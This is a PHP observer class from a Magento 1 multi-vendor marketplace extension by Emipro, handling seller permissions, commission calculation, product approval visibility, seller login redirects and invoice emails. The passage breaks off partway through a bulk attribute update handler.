<?php

/*
 * //////////////////////////////////////////////////////////////////////////////////////
 *
 * @author   Emipro Technologies
 * @Category Emipro
 * @package  Emipro_Marketplace
 * @license http://shop.emiprotechnologies.com/license-agreement/
 *
 * //////////////////////////////////////////////////////////////////////////////////////
 */

class Emipro_Marketplace_Model_Observer
{

    /*
     * check some block type and remove menu in seller and admin panel
     */

    public function adminhtml_block_html_before($observer)
    {
        $block = $observer->getBlock();
        if (!isset($block)) {
            return $this;
        }

        if (Mage::helper('marketplace')->getSellerIdfromLoginUser()) {
            if ($block->getType() == 'adminhtml/sales_shipment_grid') {
                $block->removeColumn('total_qty');
                $block->sortColumnsByOrder();
            }
            if ($block->getType() == 'adminhtml/sales_order_grid') {
                $block->removeColumn('base_grand_total');
                $block->removeColumn('store_id');
                $block->removeColumn('grand_total');
                $block->sortColumnsByOrder();
            }
            if ($block->getType() == 'adminhtml/catalog_product_grid') {
                $block->removeColumn('websites');
                $block->sortColumnsByOrder();
            }
            if ($observer->getBlock() instanceof Mage_Adminhtml_Block_Page_Menu) {
                $config = Mage::getSingleton('admin/config')->getAdminhtmlConfig();
                $menu = $config->getNode('menu');
                if ($menu->catalog) {
                    $menu->catalog->title = Mage::helper("marketplace")->__("Manage Products");
                }
                if ($menu->catalog->children->products) {
                    $menu->catalog->children->products->title = Mage::helper("marketplace")->__("Product List");
                }
                if ($menu->system) {
                    unset($menu->system);
                }
                if ($menu->marketplace->children->adminsupport) {
                    unset($menu->marketplace->children->adminsupport);
                }
                if ($menu->marketplace->children->seller) {
                    //flexi sellers
                    unset($menu->marketplace->children->seller);
                }
                if ($menu->marketplace->children->seller_pricerules) {
                    unset($menu->marketplace->children->seller_pricerules);
                }
                if ($menu->cms) {
                    unset($menu->cms);
                }
            }
        } else {
            if ($observer->getBlock() instanceof Mage_Adminhtml_Block_Page_Menu) {
                $config = Mage::getSingleton('admin/config')->getAdminhtmlConfig();
                $menu = $config->getNode('menu');
                if ($menu->marketplacedashboard) {
                    unset($menu->marketplacedashboard);
                }
                if ($menu->marketplace->children->seller_profile) {
                    unset($menu->marketplace->children->seller_profile);
                }
                if ($menu->marketplace->children->seller_bankdetails) {
                    unset($menu->marketplace->children->seller_bankdetails);
                }
                if ($menu->catalog->children->add_new_product) {
                    unset($menu->catalog->children->add_new_product);
                }
                if ($menu->catalog->children->multiple_image_upload) {
                    unset($menu->catalog->children->multiple_image_upload);
                }
                if ($menu->marketplace->children->seller_withdraw) {
                    $menu->marketplace->children->seller_withdraw->title = Mage::helper("marketplace")->__("Seller Withdrawals");
                }
                if ($menu->marketplace->children->sellerhelpdesk) {
                    unset($menu->marketplace->children->sellerhelpdesk);
                }
                if ($menu->marketplace->children->seller_account) {
                    unset($menu->marketplace->children->seller_account);
                }
                if ($menu->catalog->children->add_new_product) {
                    unset($menu->catalog->children->add_new_product);
                }
                if ($menu->catalog->children->bulkproductimport) {
                    unset($menu->catalog->children->bulkproductimport);
                }
                if ($menu->catalog->children->export) {
                    unset($menu->catalog->children->export);
                }
            }
        }
    }

    /*
     * check that seller is not editing other seller product
     */

    public function producteditbefore($observer)
    {

        if (Mage::helper('marketplace')->getSellerIdfromLoginUser()) {

            $product = Mage::registry('product');
            if ($product->getId()) {

                $optionid = Mage::helper("marketplace")->getProuctVendorid(Mage::getSingleton('admin/session')->getUser()->getUserId());
                if ($optionid) {
                    $collect = Mage::getModel('catalog/product')->getCollection()->addAttributeToFilter('vendor_id', $optionid);
                }

                $allow = false;
                foreach ($collect->getData() as $item) {
                    if ($product->getId() == $item['entity_id']) {
                        $allow = true;
                    }
                }
                if (!$allow) {
                    if (Mage::registry('seller_product_form_edit')) {
                        return;
                    }
                    $redirecturl = Mage::helper("adminhtml")->getUrl('adminhtml/catalog_product/index');
                    Mage::getSingleton('core/session')->addError('Other seller product can not edit.');
                    $response = Mage::app()->getResponse();
                    $response->setRedirect($redirecturl);
                    Mage::register('seller_product_form_edit', true);
                }
            }
        }
    }

    /*
     * check values before seller save product
     */

    public function catalog_product_save_before($observer)
    {
        $optionid = '';
        if (Mage::helper('marketplace')->getSellerIdfromLoginUser()) {
            $optionid = Mage::helper("marketplace")->getProuctVendorid(Mage::getSingleton('admin/session')->getUser()->getUserId());
            $product = $observer->getProduct();
            $product->setVendorId($optionid);

            $sellerid = Mage::helper('marketplace')->getSellerIdfromLoginUser();
            $seller = Mage::getModel('marketplace/list')->load($sellerid);
            /*if (isset($seller) && $seller->getId()) {
                $product->setWebsiteIds(array($seller->getWebsiteId()));
            }*/

            $param = Mage::app()->getFrontController()->getRequest()->getParams();
            $attrsetid = '';

            if (isset($param) && !empty($param)) {
                $attrsetid = isset($param['set']) ? $param['set'] : '';
                $type = isset($param['type']) ? $param['type'] : '';
            }
            $_sellerid = Mage::helper('marketplace')->getSellerIdfromLoginUser();
            $_sellerdetail = Mage::getModel('marketplace/seller')->load($_sellerid, 'seller_id');
            if (isset($_sellerdetail) && $_sellerdetail->getId() != '') {
                if ($product->getOrigData('marketplace_product_approve') == '') {
                    if (!$_sellerdetail->getDefaultProductApprove()) {
                        $product->setMarketplaceProductApprove(0);
                    } else {
                        $product->setMarketplaceProductApprove(1);
                    }
                } else {
                    $product->setMarketplaceProductApprove($product->getOrigData('marketplace_product_approve'));
                }
            }
            if ($attrsetid != '') {
                //$categorydata = Mage::getModel('marketplace/sellercategory')->getCollection()->addFieldToFilter('attributeset_id', $attrsetid)->getFirstItem();
                $categoryid = Mage::getSingleton('adminhtml/session')->getCategoryIdCustom(true);
                if ($categoryid != '') {
                    $product->setCategoryIds(array($categoryid));
                }
            }
        }
    }

    /*
     * when order item shipped calculate commission for seller if seller credit days set to 0
     */

    public function order_success_action($observer)
    {
        //changed by rakesh 2-12-14
        $shipment = $observer->getEvent()->getShipment();
        if (isset($shipment)) {
            $order = $shipment->getOrder();
            $shippingcharge = array();
            $order_items = $order->getAllItems();
            foreach ($order_items as $o_item) {
                $shippingcharge[$o_item->getItemId()] = isset($o_item['base_shipping_charge']) ? $o_item['base_shipping_charge'] : '';
            }
            $items = $shipment->getAllItems();
            $i = 0;
            $checkincludetax = Mage::getStoreConfig('marketplace_setting/marketplace/catalogprice_includes_tax');
            foreach ($items as $item) {
                $itemshippingcharge = isset($shippingcharge[$item->getOrderItemId()]) ? $shippingcharge[$item->getOrderItemId()] : '';
                if ($item->getParentItemId() == '') {
                    try {
                        $prod = Mage::getModel('catalog/product')->load($item->getData("product_id"));
                        if ($prod->getTypeId() != 'bundle') {
                            if ($prod->getVendorId() != '') {
                                $seller = Mage::getModel('marketplace/list')->getCollection()->addFieldToFilter('product_vendor_id', $prod->getVendorId())->getFirstItem()->getData();
                                if (isset($seller['id']) && $seller['id'] != '') {
                                    $sellerdetail = Mage::getModel('marketplace/seller')->load($seller['id'], "seller_id");
                                    $days = '';
                                    if ($sellerdetail->getId()) {
                                        $days = $sellerdetail->getSellerCreditDays();
                                    }
                                    $qty = $item->getData("qty");
                                    if ($qty > 0) {
                                        $totalprice = '';
                                        $baseprice = $item->getBasePrice();
                                        $totalprice = ($baseprice * $qty);
                                        if ($checkincludetax) {
                                            $basepriceincludetax = $item->getBasePriceInclTax();
                                            if ($basepriceincludetax != '') {
                                                $totalprice = ($basepriceincludetax * $qty);
                                                $baseprice = $basepriceincludetax;
                                            }
                                        }
                                        if ($itemshippingcharge > 0) {
                                            $commissionolddata = Mage::getModel('marketplace/commission')->getCollection();
                                            $commissionolddata->addFieldToFilter('base_shipping_charge', $itemshippingcharge);
                                            $commissionolddata->addFieldToFilter('order_item_id', $item->getOrderItemId());
                                            $commissionolddata->addFieldToFilter('product_id', $prod->getId());
                                            $commissionolddata->addFieldToFilter('type', 0);
                                            if ($commissionolddata->count() == 0) {
                                                $totalprice += $itemshippingcharge;
                                            } else {
                                                $itemshippingcharge = null;
                                            }
                                        }
                                        $comm_amt = Mage::helper("marketplace")->getSellerCommissionAmount($seller['id'], $item->getProductId(), $baseprice, $qty, $itemshippingcharge);
                                        $seller_credit = '';
                                        if (!$days) {
                                            $seller_credit = $totalprice - $comm_amt;
                                            $data = array(
                                                'seller_id' => $seller['id'],
                                                'order_increment_id' => $order->getIncrementId(),
                                                'order_item_id' => $item->getOrderItemId(),
                                                'product_id' => $item->getData("product_id"),
                                                'base_shipping_charge' => $itemshippingcharge,
                                                'commission_amt' => $comm_amt,
                                                'seller_credit' => $seller_credit,
                                                'summary' => '',
                                                'qty' => $qty,
                                                'date' => now(),
                                                'type' => 0,
                                            );
                                            $modelcommission = Mage::getModel('marketplace/commission');
                                            $modelcommission->setData($data);
                                            $modelcommission->save();
                                            if ($modelcommission->getId()) {
                                                $balance_statement = array();
                                                $balance_statement["transaction_id"] = $modelcommission->getId();
                                                $balance_statement["transaction_type"] = "order";
                                                $balance_statement["credit"] = $modelcommission->getSellerCredit();
                                                $balance_statement["date"] = $modelcommission->getDate();
                                                $balance_statement["seller_id"] = $modelcommission->getSellerId();
                                                $balance_statement["order_id"] = $modelcommission->getOrderIncrementId();
                                                Mage::helper("marketplace")->saveTransactionReport($balance_statement);
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    } catch (Exception $e) {
                        Mage::log('error while shipment commission count');
                    }
                    $i++;
                }
            }
        }
    }

    /*
     * Hide product in category page if marketplace approved set to No
     */

    public function hideproduct($observer)
    {
        $flatcatalog = Mage::getStoreConfig('catalog/frontend/flat_catalog_product');
        $collection = $observer->getEvent()->getCollection();
        $productIds = $collection->getAllIds();
        $sellers = Mage::getModel('marketplace/list')->getCollection()->addFieldToFilter('status', 'block')->addFieldToSelect('product_vendor_id');
        $blockedproductids = $sellers->getColumnValues('product_vendor_id');

        if ($flatcatalog) {
            $blockprod = Mage::getModel('catalog/product')->getCollection()
                ->addAttributeToSelect(array('entity_id', 'vendor_id'))
                ->addAttributeToFilter(
                    array(
                        array('attribute' => 'vendor_id', 'in' => $blockedproductids),
                    )
                );
            $exclude_ids1 = $blockprod->getColumnValues('entity_id');

            $prodCollection = Mage::getModel('catalog/product')->getCollection()
                ->addAttributeToSelect(array('entity_id', 'vendor_id', 'marketplace_product_approve'))
                ->addAttributeToFilter(
                    array(
                        array('attribute' => 'vendor_id', 'neq' => ''),
                    )
                )
                ->addAttributeToFilter(
                    array(
                        array('attribute' => 'marketplace_product_approve', 'eq' => 0),
                    )
                );
            $exclude_ids2 = $prodCollection->getColumnValues('entity_id');

            $exclude_ids = array_merge($exclude_ids1, $exclude_ids2);
            if (isset($exclude_ids) && !empty($exclude_ids)) {
                if ($flatcatalog) {
                    $collection->addAttributeToSelect(array('entity_id'))
                        ->addAttributeToFilter(
                            array(
                                array('attribute' => 'entity_id', 'nin' => $exclude_ids),
                            )
                        );
                }
            }

        } else {
            $blockprod = Mage::getModel('catalog/product')->getCollection();
            $blockprod->addAttributeToFilter('entity_id', array('in' => $productIds))
                ->addAttributeToFilter('vendor_id', array('in' => $blockedproductids));
            $exclude_ids1 = $blockprod->getAllIds();

            $prodCollection = Mage::getModel('catalog/product')->getCollection();
            $prodCollection->addAttributeToFilter('entity_id', array('in' => $productIds))
                ->addAttributeToFilter('vendor_id', array('neq' => ''))
                ->addAttributeToFilter('marketplace_product_approve', 0);
            $exclude_ids2 = $prodCollection->getAllIds();

            $exclude_ids = array_merge($exclude_ids1, $exclude_ids2);
            if (isset($exclude_ids) && !empty($exclude_ids)) {
                if (!$flatcatalog) {
                    $collection->addAttributeToFilter('entity_id', array('nin' => $exclude_ids));
                }
            }

        }
    }

    /*
     * Hide product in product page if marketplace approved set to No
     */

    public function hideproduct_product_page($observer)
    {
        $product = $observer->getEvent()->getProduct();
        $approvevar = $product->getData('marketplace_product_approve');
        $vendorid = $product->getData('vendor_id');
        $sellers = Mage::getModel('marketplace/list')->getCollection()->addFieldToFilter('status', 'block')->addFieldToSelect('product_vendor_id');
        $blockedproductids = $sellers->getColumnValues('product_vendor_id');
        if (isset($blockedproductids) && !empty($blockedproductids)) {
            if (in_array($vendorid, $blockedproductids)) {
                $response = Mage::app()->getFrontController()->getResponse();
                $response->setRedirect(Mage::getBaseUrl());
                $response->sendResponse();
                exit();
            }
        }
        if ($vendorid != '' && $approvevar != 1) {
            $response = Mage::app()->getFrontController()->getResponse();
            $response->setRedirect(Mage::getBaseUrl());
            $response->sendResponse();
            exit();
        }
    }

    /*
     * Controller method check with predispatch event
     * Admin login, logout check, sellerlogin and resetpassword check
     * Sales order and shipment method check
     * Product check in cart
     */

    public function methodcheck($observer)
    {
        if (Mage::getDesign()->getArea() == 'adminhtml') {
            if ($observer->getEvent()->getControllerAction()->getFullActionName() == 'adminhtml_index_login') {
                $postdata = Mage::app()->getFrontController()->getRequest()->getParams();
                if (isset($postdata['login']['username']) && !empty($postdata['login']['username'])) {
                    $username = $postdata['login']['username'];
                    $isseller = Mage::app()->getFrontController()->getRequest()->getParam('seller', 0);
                    $users = Mage::getModel('admin/user')->getCollection()->addFieldToFilter('username', $username);
                    if ($isseller) {
                        $atpos = strpos($username, '@');
                        $dotpos = strpos($username, '.');
                        if ($atpos > 0 && $dotpos > 0) {
                            $users = Mage::getModel('admin/user')->getCollection()->addFieldToFilter('email', $username);
                            if (count($users)) {
                                $user_data = $users->getFirstItem()->getData();
                                if (isset($user_data['username']) && !empty($user_data['username'])) {
                                    $postdata['login']['username'] = $user_data['username'];
                                    Mage::app()->getFrontController()->getRequest()->setPost('login', array('username' => $postdata['login']['username'], 'password' => $postdata['login']['password']));
                                }
                            }
                        }
                    }
                    $role_data = $users->getFirstItem()->getRole()->getData();
                    if ($role_data['role_name'] != 'Seller/Vendor' && $isseller) {
                        Mage::app()->getFrontController()->getResponse()->setRedirect(Mage::getBaseUrl() . 'marketplace/sellerlogin/?failed');
                        Mage::app()->getResponse()->sendResponse();
                        exit;
                    }
                }
            }
            if ($observer->getEvent()->getControllerAction()->getFullActionName() == 'adminhtml_index_index') {
                $postdata = Mage::app()->getFrontController()->getRequest()->getParams();
                if (isset($postdata['login']['username']) && !empty($postdata['login']['username'])) {
                    $username = $postdata['login']['username'];
                    $isseller = Mage::app()->getFrontController()->getRequest()->getParam('seller', 0);
                    $users = Mage::getModel('admin/user')->getCollection()->addFieldToFilter('username', $username);
                    $role_data = $users->getFirstItem()->getRole()->getData();
                    if ($role_data['role_name'] == 'Seller/Vendor' && !$isseller) {
                        $adminfrontname = (string) Mage::getConfig()->getNode("admin/routers/adminhtml/args")->frontName;
                        Mage::getSingleton('adminhtml/session')->addError('Invalid User Name or Password.');
                        Mage::app()->getFrontController()->getResponse()->setRedirect(Mage::getBaseUrl() . $adminfrontname);
                        Mage::app()->getResponse()->sendResponse();
                        exit;
                    }
                }
            }
            if ($observer->getEvent()->getControllerAction()->getFullActionName() == 'adminhtml_index_logout') {
                $adminSession = Mage::getSingleton('admin/session');
                $adminSession->unsetAll();
                $adminSession->getCookie()->delete($adminSession->getSessionName());
                $adminSession->addSuccess(Mage::helper('adminhtml')->__('You have logged out.'));
                $params = Mage::app()->getFrontController()->getRequest()->getParams();
                if (isset($params['seller'])) {
                    $seller_cookie = Mage::getModel('core/cookie')->get('emsellerloginid');
                    if ($seller_cookie) {
                        Mage::getModel('core/cookie')->delete('emsellerloginid');
                    }
                    Mage::app()->getFrontController()->getResponse()->setRedirect(Mage::getUrl('marketplace/sellerlogin'));
                    Mage::app()->getResponse()->sendResponse();
                    exit;
                }
            }

            if ($observer->getEvent()->getControllerAction()->getFullActionName() == 'adminhtml_index_resetpasswordpost') {
                $error = '';
                $data = Mage::app()->getRequest()->getParams();
                if (isset($data['id']) && !empty($data['id'])) {
                    $seller_obj = Mage::getModel('marketplace/list')->load($data['id'], 'seller_admin_id');
                    if ($seller_obj->getId()) {
                        if (empty($data['token']) || empty($data['id']) || $data['id'] < 0) {
                            $error = '?invalid';
                        } else {

                            $user = Mage::getModel('admin/user')->load($data['id']);
                            if (!$user || !$user->getId()) {
                                $error = '?wrong';
                            }
                            if ($error == '') {
                                $userToken = $user->getRpToken();
                                if (strcmp($userToken, $data['token']) != 0 || $user->isResetPasswordLinkTokenExpired()) {
                                    $error = '?expired';
                                }
                            }
                        }
                        if ($error != '') {
                            Mage::getSingleton('adminhtml/session')->getMessages(true);
                            Mage::app()->getFrontController()->getResponse()->setRedirect(Mage::getUrl('marketplace/sellerlogin') . $error);
                            Mage::app()->getResponse()->sendResponse();
                            exit;
                        }
                    }
                }
            }

            $configurl = Mage::getBaseUrl() . 'marketplace/sellerlogin';
            $user = Mage::getSingleton('admin/session')->getUser();
            if (isset($user) && !$user->getIsActive()) {
                $sellerid = Mage::helper('marketplace')->getSellerIdfromLoginUser();
                if ($sellerid) {
                    $adminSession = Mage::getSingleton('admin/session');
                    $adminSession->unsetAll();
                    $adminSession->getCookie()->delete($adminSession->getSessionName());
                    header('Location:' . $configurl);
                    exit;
                }
            }
            if (!(isset($user))) {
                $currentUrl = Mage::helper('core/url')->getCurrentUrl();
                if ($currentUrl != $configurl) {
                    $pos = strpos($currentUrl, 'admin/system_account');
                    $pos2 = strpos($currentUrl, 'admin/sales_order');
                    if ($pos > 0 || $pos2 > 0) {
                        header('Location:' . $configurl);
                        exit;
                    }
                }
            }
        }
        $sellerid = Mage::helper('marketplace')->getSellerIdfromLoginUser();
        if ($sellerid) {
            if ($observer->getEvent()->getControllerAction()->getFullActionName() == 'adminhtml_sales_order_shipment_new') {
                $order_id = Mage::app()->getRequest()->getParam('order_id');
                if ($order_id != '') {
                    if (Mage::helper('marketplace')->shipmentAvailable($order_id)) {
                        Mage::getSingleton('core/session')->addError('Shipment is already done.');
                        $response = Mage::app()->getResponse();
                        $redirecturl = Mage::helper("adminhtml")->getUrl('adminhtml/sales_order/view', array('order_id' => $order_id));
                        $response->setRedirect($redirecturl);
                        return;
                    }
                }
            }
            if (Mage::app()->getRequest()->getControllerName() == 'adminhtml_sales_order_invoice' || Mage::app()->getRequest()->getControllerName() == 'sales_invoice') {
                if (!Mage::getStoreConfig('marketplace_setting/marketplace/sellerinvoice')) {
                    Mage::getSingleton('core/session')->addError('Seller can not create invoice.');
                    $controller = $observer->getControllerAction();
                    $controller->getRequest()->setDispatched(true);
                    $controller->setFlag(
                        '',
                        Mage_Core_Controller_Front_Action::FLAG_NO_DISPATCH,
                        true
                    );
                    $response = Mage::app()->getResponse();
                    $redirecturl = Mage::helper("adminhtml")->getUrl('adminhtml/sales_order/index');
                    $response->setRedirect($redirecturl);
                    return;
                }
                $fullactionname = $observer->getEvent()->getControllerAction()->getFullActionName();
                if ($fullactionname == 'adminhtml_sales_order_invoice_view') {
                    $order_id = Mage::app()->getRequest()->getParam('order_id');
                    if ($order_id != '') {
                        $invoice_id = Mage::app()->getRequest()->getParam('invoice_id');
                        $invoice = Mage::getModel("sales/order_invoice")->load($invoice_id);
                        $sellerid = Mage::helper('marketplace')->getSellerIdfromLoginUser();
                        $sellerids = Mage::helper("marketplace")->sellerProductIds();
                        $productids = array_keys($sellerids, $sellerid);
                        $flag = true;
                        foreach ($invoice->getAllItems() as $i) {
                            if (in_array($i->getProductId(), $productids)) {
                                $flag = false;
                                break;
                            }
                        }
                        if ($flag) {
                            Mage::getSingleton('core/session')->addError('You can not see other seller invoice.');
                            $controller = $observer->getControllerAction();
                            $controller->getRequest()->setDispatched(true);
                            $controller->setFlag(
                                '',
                                Mage_Core_Controller_Front_Action::FLAG_NO_DISPATCH,
                                true
                            );
                            $response = Mage::app()->getResponse();
                            $redirecturl = Mage::helper("adminhtml")->getUrl('adminhtml/sales_order/view', array('order_id' => $order_id));
                            $response->setRedirect($redirecturl);
                            return;
                        }
                    }
                }
                if ($fullactionname == 'adminhtml_sales_order_invoice_new') {
                    $order_id = Mage::app()->getRequest()->getParam('order_id');
                    if ($order_id != '') {
                        $order = Mage::getModel('sales/order')->load($order_id);
                        $items = $order->getAllItems();
                        $sellerids = Mage::helper("marketplace")->sellerProductIds();
                        $productids = array_keys($sellerids, $sellerid);
                        $flag = true;
                        foreach ($items as $i) {
                            if (in_array($i->getProductId(), $productids)) {
                                if ($i->getQtyOrdered() > $i->getQtyInvoiced()) {
                                    $flag = false;
                                    break;
                                }
                            }
                        }
                        if ($flag) {
                            Mage::getSingleton('core/session')->addError('You have created invoice already.');
                            $controller = $observer->getControllerAction();
                            $controller->getRequest()->setDispatched(true);
                            $controller->setFlag(
                                '',
                                Mage_Core_Controller_Front_Action::FLAG_NO_DISPATCH,
                                true
                            );
                            $response = Mage::app()->getResponse();
                            $redirecturl = Mage::helper("adminhtml")->getUrl('adminhtml/sales_order/view', array('order_id' => $order_id));
                            $response->setRedirect($redirecturl);
                            return;
                        }
                    }
                }
            }
        }
        if ($observer->getEvent()->getControllerAction()->getFullActionName() == 'checkout_cart_index') {
            $array = Mage::getModel('catalog/product')->getCollection()->addAttributeToFilter('vendor_id', array('neq' => ''))->addAttributeToFilter('marketplace_product_approve', 0)->getAllIds();
            $cartHelper = Mage::helper('checkout/cart');
            $items = $cartHelper->getCart()->getItems();
            $removeprod = array();
            foreach ($items as $item) {
                if (in_array($item->getProduct()->getId(), $array)) {
                    $removeprod[] = $item->getProduct()->getId();
                    $itemId = $item->getItemId();
                    $cartHelper->getCart()->removeItem($itemId)->save();
                }
            }
            if (isset($removeprod) && !empty($removeprod)) {
                Mage::getSingleton('core/session')->addError('Product removed from cart which are not approved in marketplace.');
                $response = Mage::app()->getResponse();
                $response->setRedirect(Mage::getBaseUrl() . 'checkout/cart/');
            }
        }
        if ($observer->getEvent()->getControllerAction()->getFullActionName() == 'cms_index_noRoute') {
            $this->sellerStoreurlCheck($observer);
        }
    }

    /*
     * Url rewrite update for seller frontend page and seller product page
     */

    public function sellerStoreurlCheck($observer)
    {
        $urlString = Mage::helper('core/url')->getCurrentUrl();
        $relUrl = str_replace('index.php/', '', $urlString);
        $relUrl = str_replace(Mage::getBaseUrl(Mage_Core_Model_Store::URL_TYPE_WEB), '', $relUrl);
        $storename = '';
        if (strpos($relUrl, '?') > 0) {
            $storename = substr($relUrl, 0, strpos($relUrl, '?'));
        } else {
            $storename = $relUrl;
        }

        $request = '';
        $IdPath = '';
        $target = '';
        $storeid = Mage::app()->getStore()->getId();
        $websiteId = Mage::app()->getWebsite()->getId();
        if (strpos($storename, '/products')) {
            $repstr = strpos($storename, '/products/') ? '/products/' : '/products';
            $storename1 = str_replace($repstr, '', $storename);
            $sellerdetail = Mage::getModel('marketplace/seller')->getCollection()->addFieldToFilter('store_url', array('like' => $storename1));
            if (count($sellerdetail) == 1) {
                $sellerData = $sellerdetail->getFirstItem();
                $seller = Mage::getModel('marketplace/list')->load($sellerData->getSellerId());
                if ($seller->getId()) {
                    if ($seller->getStatus() != 'approved' || $seller->getWebsiteId() != $websiteId) {
                        return;
                    }
                }
                $request = $sellerData->getStoreUrl() . '/products';
                $IdPath = "seller/prod/" . Mage::app()->getStore()->getId() . "/" . $sellerData->getSellerId();
                $target = "marketplace/seller/productview/id/" . $sellerData->getSellerId();
            }
        } else {
            $pos = strpos($storename, '/');
            if ($pos > 0) {
                $storename = substr($storename, 0, $pos);
            }
            $sellerdetail = Mage::getModel('marketplace/seller')->getCollection()->addFieldToFilter('store_url', array('like' => $storename));
            if (count($sellerdetail) == 1) {
                $sellerData = $sellerdetail->getFirstItem();
                $seller = Mage::getModel('marketplace/list')->load($sellerData->getSellerId());
                if ($seller->getId()) {
                    if ($seller->getStatus() != 'approved' || $seller->getWebsiteId() != $websiteId) {
                        return;
                    }
                }
                $request = $sellerData->getStoreUrl();
                $IdPath = "seller/" . Mage::app()->getStore()->getId() . "/" . $sellerData->getSellerId();
                $target = "marketplace/seller/viewprofile/profile_id/" . $sellerData->getSellerId();
            }
        }
        if ($request != '' && $IdPath != '' && $target != '') {
            $urlcollection = Mage::getModel('core/url_rewrite')->getCollection();
            $urlcollection->addFieldToFilter("id_path", $IdPath)->addFieldToFilter('store_id', $storeid);
            if (count($urlcollection) < 1) {
                $urlModel = Mage::getModel('core/url_rewrite');
                $urlModel->setIsSystem(0)
                    ->setStoreId($storeid)
                //->setOptions('RP')
                    ->setIdPath($IdPath)
                    ->setTargetPath($target)
                    ->setRequestPath($request);
                try {
                    $urlModel->save();
                } catch (Exception $e) {
                    echo $e->getMessage();
                }
                $targeturl = Mage::getBaseUrl() . $request;
                header('Location: ' . $targeturl);
                exit;
            }
        }
    }

    /*
     * Controller method check with postdispatch event
     * Admin forgotpassword, resetpassword and login check
     */

    public function postmethodcheck($observer)
    {
        if (Mage::getDesign()->getArea() == 'adminhtml') {
            if ($observer->getEvent()->getControllerAction()->getFullActionName() == 'adminhtml_index_forgotpassword') {
                $isseller = Mage::app()->getFrontController()->getRequest()->getParam('seller', 0);
                if ($isseller) {
                    Mage::app()->getFrontController()->getResponse()->setRedirect(Mage::getUrl('marketplace/sellerlogin') . '?reset');
                    Mage::app()->getResponse()->sendResponse();
                    exit;
                }
            }

            if ($observer->getEvent()->getControllerAction()->getFullActionName() == 'adminhtml_index_resetpassword') {
                $data = Mage::app()->getRequest()->getParams();
                if (isset($data['id']) && !empty($data['id'])) {
                    $seller_obj = Mage::getModel('marketplace/list')->load($data['id'], 'seller_admin_id');
                    if ($seller_obj->getId()) {
                        Mage::app()->getFrontController()->getResponse()->setRedirect(Mage::getUrl('marketplace/sellerlogin/resetpassword', array('id' => $data['id'], 'token' => $data['token'])));
                        Mage::app()->getResponse()->sendResponse();
                        exit;
                    }
                }
            }

            if ($observer->getEvent()->getControllerAction()->getFullActionName() == 'adminhtml_index_resetpasswordpost') {
                try {
                    $data = Mage::app()->getRequest()->getParams();
                    if (isset($data['id']) && !empty($data['id'])) {
                        $seller_obj = Mage::getModel('marketplace/list')->load($data['id'], 'seller_admin_id');
                        if ($seller_obj->getId()) {
                            if (isset($data['password']) && isset($data['confirmation'])) {
                                if ($data['password'] == $data['confirmation']) {
                                    Mage::getSingleton('adminhtml/session')->getMessages(true);
                                    Mage::app()->getFrontController()->getResponse()->setRedirect(Mage::getUrl('marketplace/sellerlogin') . '?updated');
                                    Mage::app()->getResponse()->sendResponse();
                                    exit;
                                }
                            }
                        }
                    }
                } catch (Exception $e) {
                    Mage::log($e->getMessage());
                }
            }
            if ($observer->getEvent()->getControllerAction()->getFullActionName() == 'adminhtml_index_login') {
                $seller_cookie = Mage::getModel('core/cookie')->get('emsellerloginid');
                if ($seller_cookie) {
                    Mage::getModel('core/cookie')->delete('emsellerloginid');
                    Mage::app()->getFrontController()->getResponse()->setRedirect(Mage::getUrl('marketplace/sellerlogin'));
                    Mage::app()->getResponse()->sendResponse();
                    exit;
                }
            }
        }
    }

    /*
     * Order invoice mail to seller
     */

    public function orderinvoicemail(Varien_Event_Observer $observer)
    {
        $invoice = $observer->getEvent()->getInvoice();
        $order_id = $invoice->getOrderId();
        if ($order_id != '' && $invoice->getEntityId() != '') {
            $items = Mage::getModel('sales/order_invoice_item')->getCollection()->addFieldToFilter('parent_id', $invoice->getEntityId());
            $order = Mage::getModel('sales/order')->load($order_id);
            try {
                $senderemail = Mage::getStoreConfig('trans_email/ident_general/email');
                $_sendername = Mage::getStoreConfig('trans_email/ident_general/name');
                $emailtemplate = Mage::getModel('core/email_template')->loadByCode('seller_invoice_notification');
                $mailname = Mage::app()->getStore()->getFrontendName();
                $emailTemplateVariable['order'] = $order;
                $itemcount = count($items);
                $sellerid = array();
                $sellerproducts = array();
                foreach ($items as $itemId => $item) {
                    //mail to seller that his product is sold.
                    $productid = $item->getProductId();
                    if ($item->getParentItemId() == '') {
                        $_prod = Mage::getModel('catalog/product')->load($productid);
                        $prodVendorId = $_prod->getVendorId();
                        $seller = Mage::getModel('marketplace/list')->load($prodVendorId, 'product_vendor_id');
                        if ($seller->getId()) {
                            $sellerid[] = $seller->getId();
                            $products = array();
                            $products['name'] = $item->getName();
                            $products['price'] = $item->getBasePrice();
                            $products['qtyinvoiced'] = $item->getQty();
                            $sellerproducts[$seller->getId()][] = $products;
                        }
                    }
                }
                $sellerid = array_unique($sellerid);
                $baseCurrencyCode = Mage::app()->getStore()->getBaseCurrencyCode();
                $symbol = Mage::app()->getLocale()->currency($baseCurrencyCode)->getSymbol();
                foreach ($sellerid as $selid) {
                    $sellerdetail = Mage::getModel('marketplace/seller')->load($selid, 'seller_id');
                    if ($sellerdetail->getId()) {
                        $selleremail = $sellerdetail->getEmail();
                        $html = '<table border=0 cellspacing=10>
                                            <thead>
                                                <tr>
                                                    <th >Items In Order</th>
                                                    <th>Qty</th>
                                                    <th>Price</th>
                                                </tr>
                                            </thead>
                                            <tbody>';
                        foreach ($sellerproducts[$selid] as $_item) {
                            $html .= '<tr><td>' . $_item['name'] . '</td>
                                                <td>' . number_format($_item['qtyinvoiced'], 2) . '</td>
                                                <td>' . $symbol . number_format(($_item['price'] * $_item['qtyinvoiced']), 2) . '</td>
                                                </tr>';
                        }
                        $html .= '</tbody></table>';
                        $emailTemplateVariable['invoice'] = $invoice;
                        $emailTemplateVariable['prodhtml'] = $html;
                        $emailTemplateVariable['frontname'] = Mage::app()->getStore()->getFrontendName();
                        $emailTemplateVariable['payment_html'] = $order->getPayment()->getMethodInstance()->getTitle();
                        $emailtemplate->setSenderName($_sendername);
                        $emailtemplate->setSenderEmail($senderemail);
                        $emailtemplate->send($selleremail, $mailname, $emailTemplateVariable);
                    }
                }
            } catch (Exception $e) {
                echo $e->getMessage();
            }
        }
    }

    /*
     * Product massaction update attribute check marketplace product approve and mail to seller
     */

    public function productBulkattributeupdate(Varien_Event_Observer $observer)
    {
        $data = $observer->getEvent()->getData();
        $array = array();
        $sellerids = array();
        $seller_id = Mage::helper('marketplace')->getSellerIdfromLoginUser();
        if (!$seller_id && isset($data['attributes_data']['marketplace_product_approve'])) {
            if (isset($data['product_ids']) && !empty($data['product_ids'])) {
